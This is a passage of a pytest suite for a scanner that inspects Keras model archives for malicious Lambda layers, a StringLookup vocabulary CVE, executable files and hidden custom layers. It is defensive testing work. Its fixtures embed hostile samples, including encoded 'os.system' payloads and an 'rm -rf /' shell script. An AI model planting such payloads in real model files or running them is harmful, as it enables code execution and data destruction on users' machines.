        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert any(
            issue.severity == IssueSeverity.CRITICAL and "network_lambda" in issue.message for issue in result.issues
        )

    @pytest.mark.parametrize("function_format", ["list", "dict"])
    def test_marshaled_lambda_dotted_name_is_detected(
        self,
        tmp_path: Path,
        function_format: str,
    ) -> None:
        """Real marshalled code must retain dotted dangerous-name detection."""
        encoded_code = base64.b64encode(
            marshal.dumps(compile("import os\nos.system('payload')", "<lambda>", "exec"))
        ).decode()
        function_data: Any = [encoded_code, None, None]
        if function_format == "dict":
            function_data = {"class_name": "__lambda__", "config": {"code": encoded_code}}
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "marshalled_dotted_lambda",
                        "config": {"function": function_data},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and "marshalled_dotted_lambda" in issue.message
            and "os.system" in issue.details.get("dangerous_patterns", [])
            for issue in result.issues
        )

    @pytest.mark.parametrize("function_format", ["list", "dict"])
    def test_oversized_lambda_bytecode_is_not_decoded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        function_format: str,
    ) -> None:
        """Oversized Lambda bytecode must produce a bounded warning without base64 allocation."""
        oversized_code = "A" * (1024 * 1024 + 1)
        function_data: Any = [oversized_code, None, None]
        if function_format == "dict":
            function_data = {"class_name": "__lambda__", "config": {"code": oversized_code}}

        def fail_decode(_value: Any) -> bytes:
            raise AssertionError("oversized Lambda bytecode was decoded")

        monkeypatch.setattr(keras_utils_module.base64, "b64decode", fail_decode)
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "oversized_lambda",
                        "config": {"function": function_data},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Detection"
            and check.details.get("layer_name") == "oversized_lambda"
            and check.details.get("analysis_status") == "code_size_limit_exceeded"
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].severity == IssueSeverity.WARNING

    def test_malformed_dict_lambda_diagnostic_does_not_echo_payload(self, tmp_path: Path) -> None:
        """Malformed Lambda metadata diagnostics must not retain attacker-controlled payloads."""
        payload = "do-not-echo-this-payload"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "malformed_lambda",
                        "config": {
                            "function": {
                                "class_name": "__lambda__",
                                "config": payload,
                            }
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Detection" and check.details.get("layer_name") == "malformed_lambda"
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].details["config_type"] == "str"
        assert payload not in str(matching_checks[0].details)

    @pytest.mark.parametrize(
        ("function_data", "expected_code_type"),
        [
            ([], None),
            ([None, None, None], "NoneType"),
            (["", None, None], "str"),
        ],
    )
    def test_malformed_list_lambda_metadata_stays_warning(
        self,
        tmp_path: Path,
        function_data: list[Any],
        expected_code_type: str | None,
    ) -> None:
        """Malformed list-format Lambda metadata must remain a security finding."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "malformed_list_lambda",
                        "config": {"function": function_data},
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Detection"
            and check.details.get("layer_name") == "malformed_list_lambda"
            and check.details.get("function_format") == "list"
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].severity == IssueSeverity.WARNING
        assert matching_checks[0].details.get("code_type") == expected_code_type

    @pytest.mark.parametrize(
        ("module_name", "function_name"),
        [
            ({"unexpected": "module"}, "normalize"),
            ("custom_package.math", ["normalize"]),
        ],
    )
    def test_malformed_lambda_module_reference_stays_warning(
        self,
        tmp_path: Path,
        module_name: Any,
        function_name: Any,
    ) -> None:
        """Malformed mixed module/function metadata must not be silently accepted."""
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "malformed_module_lambda",
                        "config": {
                            "module": module_name,
                            "function_name": function_name,
                        },
                    }
                ]
            },
        }

        result = KerasZipScanner().scan(str(create_configured_keras_zip(tmp_path, config)))

        matching_checks = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Module Reference Check"
            and check.details.get("layer_name") == "malformed_module_lambda"
            and check.details.get("module_type") == type(module_name).__name__
            and check.details.get("function_type") == type(function_name).__name__
        ]
        assert len(matching_checks) == 1
        assert matching_checks[0].severity == IssueSeverity.WARNING

    def test_stringlookup_external_vocabulary_path_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Absolute StringLookup vocabulary paths should be attributed to CVE-2025-12058 on vulnerable Keras."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "leaked-vocab.txt"
        external_vocab_path.write_text("secret-token\n", encoding="utf-8")

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.WARNING
        assert cve_checks[0].details["layer_name"] == "string_lookup"
        assert cve_checks[0].details["cwe"] == "CWE-502, CWE-918"

    def test_redacted_local_version_still_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """StringLookup attribution must classify the unredacted local version."""
        raw_secret = "sk-proj-CAND061ZIPLOOKUPVERSIONSECRET000000000000"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(tmp_path / "vocab.txt")},
                    },
                ],
            },
        }
        model_path = create_configured_keras_zip(
            tmp_path,
            config,
            keras_version=f"3.11.3+{raw_secret}",
        )

        result = KerasZipScanner().scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].details["keras_version"] == "3.11.3+<redacted>"
        assert raw_secret not in result.to_json()

    def test_stringlookup_remote_vocabulary_url_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Remote StringLookup vocabulary URLs should also be attributed to CVE-2025-12058."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "https://example.com/vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(check.details.get("cve_id") == "CVE-2025-12058" for check in result.checks)

    def test_stringlookup_remote_vocabulary_url_redacts_credentials(self, tmp_path: Path) -> None:
        """Remote vocabulary findings should not preserve credentials or query secrets."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {
                            "vocabulary": (
                                "https://user:secret@example.com/download/"
                                "api_key=sk-secret-value/vocab.txt?token=sensitive#fragment"
                            )
                        },
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["vocabulary"] == "https://example.com/download/<redacted>/vocab.txt"
        serialized_result = json.dumps({"details": cve_checks[0].details, "message": cve_checks[0].message})
        assert "user" not in serialized_result
        assert "secret" not in serialized_result
        assert "sensitive" not in serialized_result
        assert "fragment" not in serialized_result

    def test_stringlookup_relative_vocabulary_path_triggers_cve_2025_12058(self, tmp_path: Path) -> None:
        """Scalar relative vocabulary paths should be treated as external files."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(
            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stringlookup_inline_vocabulary_list_stays_clean(self, tmp_path: Path) -> None:
        """Inline StringLookup vocabularies are benign and should not emit warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": ["red", "green", "blue"]},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert all(check.details.get("cve_id") != "CVE-2025-12058" for check in result.checks)
        noisy_issues = [
            issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)
        ]
        assert noisy_issues == []
        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) == 0
        assert not audit_result.issues

    @pytest.mark.parametrize(
        "keras_version",
        ["3.12.0", "3.12.0+local", "3.12.0.post1.dev0", "3.12.1.dev0"],
    )
    def test_stringlookup_external_vocabulary_path_flags_untrusted_fixed_keras_metadata(
        self,
        tmp_path: Path,
        keras_version: str,
    ) -> None:
        """Fixed-version archive metadata must not suppress runtime StringLookup risk."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
        assert len(cve_checks) == 1
        assert cve_checks[0].name == "StringLookup External Vocabulary Risk (Untrusted Version Metadata)"
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.WARNING
        assert cve_checks[0].details["metadata_only_assessment"] is True
        assert cve_checks[0].details["parse_status"] == "untrusted_artifact_version"
        assert cve_checks[0].details["version_source"] == "keras_archive_metadata"
        assert "artifact-controlled version metadata cannot prove the loader runtime is fixed" in cve_checks[0].message
        assert result.has_warnings is True
        _assert_no_stale_inconclusive_metadata(result)
        assert any(issue.details.get("cve_id") == "CVE-2025-12058" for issue in result.issues)

        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) == 1
        assert any(issue.details.get("cve_id") == "CVE-2025-12058" for issue in audit_result.issues)

    def test_stringlookup_external_vocabulary_path_unknown_version_is_warning_exit1(self, tmp_path: Path) -> None:
        """Missing Keras version context should remain a warning-level security decision."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }
        model_path = tmp_path / "model.keras"
        with zipfile.ZipFile(model_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(model_path))

        risk_checks = [
            check for check in result.checks if check.name == "StringLookup External Vocabulary Risk (Version Unknown)"
        ]
        assert len(risk_checks) == 1
        assert risk_checks[0].status == CheckStatus.FAILED
        assert risk_checks[0].severity == IssueSeverity.WARNING
        assert result.has_warnings is True
        _assert_no_stale_inconclusive_metadata(result)

        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) == 1

    def test_stringlookup_windows_home_relative_path_is_detected(self, tmp_path: Path) -> None:
        """Windows-style home-relative vocabulary paths should be normalized and detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "~\\vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
        result = scanner.scan(str(model_path))

        assert any(
            check.details.get("cve_id") == "CVE-2025-12058" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stringlookup_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Prereleases of the fixed Keras version are still vulnerable."""
        scanner = KerasZipScanner()
        external_vocab_path = tmp_path / "vocab.txt"
        external_vocab_path.write_text("token\n", encoding="utf-8")
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": str(external_vocab_path)},
                    },
                ],
            },
        }

        for keras_version in ("3.12.0a0", "3.12.0rc1", "3.12.0_c1", "3.12.0.dev0"):
            model_path = create_configured_keras_zip(tmp_path, config, keras_version=keras_version)
            result = scanner.scan(str(model_path))

            cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
            assert len(cve_checks) == 1
            assert cve_checks[0].status == CheckStatus.FAILED
            assert cve_checks[0].severity == IssueSeverity.WARNING

    def test_stringlookup_noncanonical_version_is_warning_exit1(self, tmp_path: Path) -> None:
        """Malformed Keras metadata should not be treated as a verified fixed version."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.12.0rc1junk")
        result = scanner.scan(str(model_path))

        risk_checks = [
            check for check in result.checks if check.name == "StringLookup External Vocabulary Risk (Version Unknown)"
        ]
        assert len(risk_checks) == 1
        assert risk_checks[0].status == CheckStatus.FAILED
        assert risk_checks[0].severity == IssueSeverity.WARNING
        assert risk_checks[0].details["keras_version"] == "3.12.0rc1junk"
        assert "non-canonical" in risk_checks[0].message
        _assert_no_stale_inconclusive_metadata(result)

        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) == 1

    def test_stringlookup_noncanonical_pre_fix_version_keeps_cve_attribution(self, tmp_path: Path) -> None:
        """A malformed suffix cannot erase a release tuple that is definitely below the fix."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "StringLookup",
                        "name": "string_lookup",
                        "config": {"vocabulary": "vocab.txt"},
                    },
                ],
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3rc1junk")
        result = scanner.scan(str(model_path))

        cve_checks = [check for check in result.checks if check.name.startswith("CVE-2025-12058:")]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.WARNING
        assert cve_checks[0].details["keras_version"] == "3.11.3rc1junk"
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME

        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) == 1

    def test_custom_registered_objects(self, tmp_path: Path) -> None:
        """Test detection of custom registered objects."""
        scanner = KerasZipScanner()

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "registered_name": "custom_package.CustomDense",
                        "config": {},
                    }
                ]
            },
        }

        temp_path = tmp_path / "custom_registered.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect custom registered object
        custom_found = False
        for check in result.checks:
            if "custom" in check.message.lower() and "registered" in check.message.lower():
                custom_found = True
                break

        assert custom_found, "Should detect custom registered objects"

    def test_executable_files_in_zip(self, tmp_path: Path) -> None:
        """Test detection of executable files in the ZIP archive."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}

        temp_path = tmp_path / "executable_files.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            # Add suspicious files
            zf.writestr("malicious.py", "import os; os.system('cmd')")
            zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")

        result = scanner.scan(str(temp_path))

        # Should detect Python and shell scripts
        suspicious_files = []
        for check in result.checks:
            if "Python file" in check.message or "Executable file" in check.message:
                suspicious_files.append(check.message)

        assert len(suspicious_files) >= 2, f"Should detect suspicious files, found: {suspicious_files}"

    def test_case_insensitive_suspicious_extension_detection(self, tmp_path: Path) -> None:
        """Uppercase/mixed-case executable extensions should be detected."""
        scanner = KerasZipScanner()

        config = {"class_name": "Sequential", "config": {"layers": []}}
        archive_path = tmp_path / "suspicious_extensions.keras"

        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("MALWARE.PY", "print('evil')")
            zf.writestr("run.SH", "#!/bin/bash\necho evil")
            zf.writestr("plugin.SO", b"\x7fELF")
            zf.writestr("libpayload.SO.6", b"\x7fELF")
            zf.writestr("plugin.Dylib", b"\xfe\xed\xfa\xcf")
            zf.writestr("launcher.BASH", "#!/usr/bin/env bash\necho evil")
            zf.writestr("runner.Cmd", "@echo off")
            zf.writestr("screensaver.SCR", b"MZ")
            zf.writestr("payload.COM", b"MZ")
            zf.writestr("dropper.PS1", "Start-Process calc.exe")

        result = scanner.scan(str(archive_path))
        suspicious_filenames = {
            check.details.get("filename")
            for check in result.checks
            if "Python file found in Keras ZIP" in check.message
            or "Executable file found in Keras ZIP" in check.message
        }
        assert {
            "MALWARE.PY",
            "run.SH",
            "plugin.SO",
            "libpayload.SO.6",
            "plugin.Dylib",
            "launcher.BASH",
            "runner.Cmd",
            "screensaver.SCR",
            "payload.COM",
            "dropper.PS1",
        }.issubset(suspicious_filenames)

    def test_executable_extension_near_matches_stay_clean(self, tmp_path: Path) -> None:
        """Executable extension near matches should not be treated as executable archive members."""
        archive_path = tmp_path / "safe.keras"
        config = {"class_name": "Sequential", "config": {"layers": []}}
        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("plugin.sology", "not a shared object")
            zf.writestr("plugin.so.version", "not a versioned shared object")
            zf.writestr("plugin.so.6cache", "not a versioned shared object")
            zf.writestr("plugin.dllcache", "not a dll")
            zf.writestr("launcher.bashrc", "not a standalone bash script")
            zf.writestr("runner.cmdline", "not a cmd script")
            zf.writestr("screensaver.scrub", "not a screensaver")
            zf.writestr("payload.composer", "not a DOS executable")
            zf.writestr("dropper.ps10", "not a PowerShell script")
            zf.writestr("installer.executable", "not a PE executable")
            zf.writestr("batch.baton", "not a batch script")

        result = KerasZipScanner().scan(str(archive_path))

        assert not any(
            check.name == "Executable File Detection" and check.status == CheckStatus.FAILED for check in result.checks
        )

    def test_nested_models(self, tmp_path: Path) -> None:
        """Test scanning of nested model structures."""
        scanner = KerasZipScanner()

        # Create nested model with Lambda in submodel
        malicious_code = '__import__("os").system("cmd")'
        encoded_code = base64.b64encode(malicious_code.encode()).decode()

        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Lambda",
                                    "name": "nested_lambda",
                                    "config": {
                                        "function": [encoded_code, None, None],
                                    },
                                }
                            ]
                        },
                    }
                ]
            },
        }

        temp_path = tmp_path / "nested_models.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))

        result = scanner.scan(str(temp_path))

        # Should detect Lambda in nested model
        assert len(result.issues) > 0, "Should detect Lambda in nested model"

        # Check that __import__ was detected
        import_found = False
        for issue in result.issues:
            if "__import__" in issue.message.lower():
                import_found = True
                break

        assert import_found, "Should detect __import__ in nested Lambda"
        assert result.metadata["model_class"] == "Model"

    def test_wrapped_layer_config_layer_scans_nested_lambda(self, tmp_path: Path) -> None:
        """Wrapper layers with `config.layer` must not hide nested Lambda payloads."""
        malicious_code = '__import__("os").system("cmd")'
        encoded_code = base64.b64encode(malicious_code.encode()).decode()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "TimeDistributed",
                            "name": "wrapped_lambda",
                            "config": {
                                "layer": {
                                    "class_name": "Lambda",
                                    "name": "inner_lambda",
                                    "config": {"function": [encoded_code, None, None]},
                                },
                            },
                        }
                    ]
                },
            },
            keras_version="2.10.0",
            file_name="wrapped_lambda.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2024-3660"]
        dangerous_lambda = [
            check
            for check in result.checks
            if check.name == "Lambda Layer Code Analysis" and check.severity == IssueSeverity.CRITICAL
        ]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["layer_name"] == "inner_lambda"
        assert dangerous_lambda
        assert determine_exit_code(audit_result) == 1

    def test_wrapped_layer_config_layer_scans_nested_custom_layer(self, tmp_path: Path) -> None:
        """Wrapper-owned custom layer configs should use the same checks as normal layers."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "TimeDistributed",
                            "name": "wrapped_custom",
                            "config": {
                                "layer": {
                                    "class_name": "MaliciousLayer",
                                    "name": "inner_custom",
                                    "config": {"name": "inner_bad"},
                                },
                            },
                        }
                    ]
                },
            },
            file_name="wrapped_custom.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert any(
            check.name == "Custom Layer Class Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("layer_class") == "MaliciousLayer"
            for check in result.checks
        )

    def test_wrapped_layer_config_backward_layer_scans_nested_custom_layer(self, tmp_path: Path) -> None:
        """Bidirectional backward layers must not hide custom nested classes."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Functional",
                "config": {
                    "layers": [
                        {
                            "class_name": "Bidirectional",
                            "name": "bidirectional_wrapper",
                            "config": {
                                "layer": {
                                    "class_name": "LSTM",
                                    "name": "forward_lstm",
                                    "config": {"name": "forward_lstm"},
                                },
                                "backward_layer": {
                                    "class_name": "MaliciousRecurrentLayer",
                                    "name": "inner_backward",
                                    "config": {"name": "inner_backward"},
                                },
                            },
                        }
                    ]
                },
            },
            file_name="wrapped_backward_custom.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["model_class"] == "Functional"
        assert any(
            check.name == "Custom Layer Class Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("layer_class") == "MaliciousRecurrentLayer"
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 1

    def test_wrapped_layer_config_recurrent_cells_are_scanned(self, tmp_path: Path) -> None:
        """RNN cell containers must not hide custom nested cells."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "RNN",
                            "name": "stacked_cell_wrapper",
                            "config": {
                                "cell": {
                                    "class_name": "StackedRNNCells",
                                    "name": "stacked_cells",
                                    "config": {
                                        "cells": [
                                            {
                                                "class_name": "LSTMCell",
                                                "name": "safe_cell",
                                                "config": {"name": "safe_cell"},
                                            },
                                            {
                                                "class_name": "MaliciousCell",
                                                "name": "inner_bad_cell",
                                                "config": {"name": "inner_bad_cell"},
                                            },
                                        ]
                                    },
                                }
                            },
                        }
                    ]
                },
            },
            file_name="wrapped_recurrent_cell.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert any(
            check.name == "Custom Layer Class Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("layer_class") == "MaliciousCell"
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("wrapper_class", "expected_exit_code"),
        [("TimeDistributed", 2), ("keras.layers.TimeDistributed", 2)],
    )
    def test_wrapped_layer_config_invalid_layer_type_fails_closed(
        self,
        tmp_path: Path,
        wrapper_class: str,
        expected_exit_code: int,
    ) -> None:
        """Malformed wrapper `config.layer` values make nested-layer coverage incomplete."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": wrapper_class,
                            "name": "broken_wrapper",
                            "config": {"layer": "not a layer dict"},
                        }
                    ]
                },
            },
            file_name="broken_wrapped_layer.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_wrapped_layer_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Wrapped Layer Type Validation" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == expected_exit_code

    def test_qualified_safe_wrapper_layer_does_not_raise_custom_layer_warning(self, tmp_path: Path) -> None:
        """Trusted fully-qualified Keras wrappers should not become custom-layer false positives."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "keras.layers.TimeDistributed",
                            "name": "qualified_wrapper",
                            "config": {
                                "layer": {
                                    "class_name": "keras.layers.Dense",
                                    "name": "inner_dense",
                                    "config": {"units": 1},
                                },
                            },
                        }
                    ]
                },
            },
            file_name="qualified_wrapped_layer.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert not any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert determine_exit_code(audit_result) == 0

    @pytest.mark.parametrize("wrapper_class", ["keras.evil.TimeDistributed", "keras.src.layers.evil.TimeDistributed"])
    def test_untrusted_qualified_wrapper_remains_custom_without_wrapper_noise(
        self,
        tmp_path: Path,
        wrapper_class: str,
    ) -> None:
        """Custom namespaces that resemble Keras wrappers must not inherit trusted wrapper semantics."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": wrapper_class,
                            "name": "custom_wrapper",
                            "config": {"layer": "ordinary custom metadata"},
                        }
                    ]
                },
            },
            file_name="untrusted_qualified_wrapper.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert any(
            check.name == "Custom Layer Class Detection" and check.details.get("layer_class") == wrapper_class
            for check in result.checks
        )
        assert not any(check.name == "Wrapped Layer Type Validation" for check in result.checks)
        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert determine_exit_code(audit_result) == 1

    def test_untrusted_qualified_wrapper_still_scans_nested_lambda(self, tmp_path: Path) -> None:
        """Custom wrapper namespaces remain warned while structured nested payloads are inspected."""
        encoded_code = base64.b64encode(b"exec('print(1)')").decode()
        wrapper_class = "keras.src.layers.evil.TimeDistributed"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": wrapper_class,
                            "name": "custom_wrapper",
                            "config": {
                                "layer": {
                                    "class_name": "Lambda",
                                    "name": "nested_lambda",
                                    "config": {"function": [encoded_code, None, None]},
                                }
                            },
                        }
                    ]
                },
            },
            keras_version="2.10.0",
            file_name="untrusted_qualified_wrapper_lambda.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert any(
            check.name == "Custom Layer Class Detection" and check.details.get("layer_class") == wrapper_class
            for check in result.checks
        )
        assert any(
            issue.details.get("cve_id") == "CVE-2024-3660" and issue.details.get("layer_name") == "nested_lambda"
            for issue in result.issues
        )
        assert not any(check.name == "Wrapped Layer Type Validation" for check in result.checks)

    def test_qualified_nested_model_scans_nested_lambda(self, tmp_path: Path) -> None:
        """Trusted qualified model containers must not hide nested Lambda payloads."""
        encoded_code = base64.b64encode(b"exec('print(1)')").decode()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "keras.models.Sequential",
                            "name": "qualified_nested_model",
                            "config": {
                                "layers": [
                                    {
                                        "class_name": "Lambda",
                                        "name": "nested_lambda",
                                        "config": {"function": [encoded_code, None, None]},
                                    }
                                ]
                            },
                        }
                    ]
                },
            },
            keras_version="2.10.0",
            file_name="qualified_nested_model.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert any(
            issue.details.get("cve_id") == "CVE-2024-3660" and issue.details.get("layer_name") == "nested_lambda"
            for issue in result.issues
        )
        assert not any(
            check.name == "Subclassed Model Detection" and check.status == CheckStatus.FAILED for check in result.checks
        )
        assert determine_exit_code(audit_result) == 1

